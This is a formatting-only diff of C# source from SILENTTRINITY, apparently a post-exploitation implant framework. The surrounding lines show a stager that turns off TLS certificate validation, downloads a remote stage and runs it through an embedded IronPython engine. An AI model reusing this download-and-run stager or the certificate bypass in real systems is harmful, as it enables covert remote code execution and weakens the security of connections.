@@ -3,8 +3,8 @@ using System.IO;
 using System.IO.Compression;
 using System.Reflection;
 using System.Net;
-using SILENTTRINITY.Utilities;
 using System.Runtime.InteropServices;
+using SILENTTRINITY.Utilities;
 
 namespace SILENTTRINITY
 {
@@ -16,9 +16,9 @@ namespace SILENTTRINITY
         {
             ServicePointManager.ServerCertificateValidationCallback +=
                                  (sender, cert, chain, sslPolicyErrors) => true;
-           
-             ServicePointManager.SecurityProtocol = (SecurityProtocolType)768 | 
-                                                    (SecurityProtocolType)3072;
+
+            ServicePointManager.SecurityProtocol = (SecurityProtocolType)768 |
+                                                   (SecurityProtocolType)3072;
 
             AppDomain.CurrentDomain.AssemblyResolve += ResolveEventHandler;
         }
@@ -55,10 +55,11 @@ namespace SILENTTRINITY
 #if DEBUG
             Console.WriteLine("[+] Running the Engine...");
 #endif
-            Engines.IronPython.Run(URL, GUID, Stage);        
+            Engines.IronPython.Run(URL, GUID, Stage);
         }
 
-        static Stream DownloadStage(Uri URL, int sleep = 5, int retries = 6) {
+        static Stream DownloadStage(Uri URL, int sleep = 5, int retries = 6)
+        {
             return Retry.Do<Stream>(() => Engines.IronPython.GetStage(URL),
                                      TimeSpan.FromSeconds(sleep), retries);
         }
@@ -69,7 +70,7 @@ namespace SILENTTRINITY
 
             byte[] bytes = Internals.GetResourceInZip(Stage, dllName) ??
                 File.ReadAllBytes(RuntimeEnvironment.GetRuntimeDirectory() + dllName);
-                
+
 #if DEBUG
             Console.WriteLine("\t[+] '{0}' loaded", dllName);
 #endif
